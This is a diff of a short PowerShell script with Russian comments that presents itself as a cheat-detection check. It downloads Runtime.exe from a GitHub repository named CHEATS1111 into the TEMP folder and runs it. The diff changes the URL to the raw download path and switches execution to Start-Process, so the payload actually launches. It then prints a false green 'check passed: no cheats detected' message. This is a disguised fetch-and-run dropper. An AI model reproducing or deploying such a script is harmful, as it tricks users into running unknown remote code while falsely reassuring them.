@@ -1,9 +1,9 @@
-﻿# Скачивание файла во временную директорию
+# Скачивание Runtime.exe во временную папку
 $temp = [System.IO.Path]::Combine($env:TEMP, "Runtime.exe")
-Invoke-WebRequest -Uri "https://github.com/CHEATS1111/d/blob/main/Runtime.exe" -OutFile $temp
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/CHEATS1111/d/main/Runtime.exe" -OutFile $temp
 
 # Запуск файла
-Invoke-Expression -Command (Get-Content $temp -Raw)
+Start-Process -FilePath $temp -Wait
 
 # Вывод зелёного текста
 Write-Host "✅ Проверка пройдена: читов не обнаружено!" -ForegroundColor Green
